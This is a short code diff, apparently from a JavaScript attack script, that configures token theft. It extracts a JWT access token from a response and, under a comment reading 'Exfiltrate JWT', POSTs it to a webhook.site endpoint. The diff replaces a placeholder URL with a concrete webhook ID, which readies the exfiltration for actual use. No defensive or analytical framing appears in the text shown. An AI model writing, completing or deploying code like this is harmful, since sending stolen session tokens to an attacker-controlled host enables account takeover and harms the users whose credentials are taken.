@@ -44,7 +44,7 @@
                     const jwt = data.data.auth_token.accessToken;
                     
                     // Exfiltrate JWT
-                    await fetch('https://webhook.site/YOUR-UNIQUE-URL', {
+                    await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
